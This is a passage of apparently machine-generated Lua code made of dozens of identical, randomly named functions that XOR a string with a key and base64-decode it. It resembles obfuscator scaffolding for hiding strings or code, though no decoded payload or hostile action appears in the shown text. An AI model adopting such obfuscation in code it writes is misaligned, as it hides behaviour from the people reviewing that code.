        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_jzjqio(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_hzvgs_(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_thzd_s(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_pjpbdg(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_sy_nro(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_nvxeq_(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_qgfofp(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ipf_il(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_dynsqm(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_neidqd(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_sddbqe(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_hzf_rw(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_atiibv(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_jbadfw(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_bbr_yg(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_shetsa(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_rkhrpw(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_qfosfl(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ugejuq(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_hily_r(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ocmkma(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_aiidsh(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ansdbu(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_bzevqn(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_dbuzca(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_tothdr(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_rjyqwa(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_gjbmbr(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_elil_c(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_jcdtbd(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_thswhq(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_qetycr(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_dyqcbw(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_bzjfdv(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_cguvjr(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_dwkbdv(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_yyetkv(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_fbuyjm(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
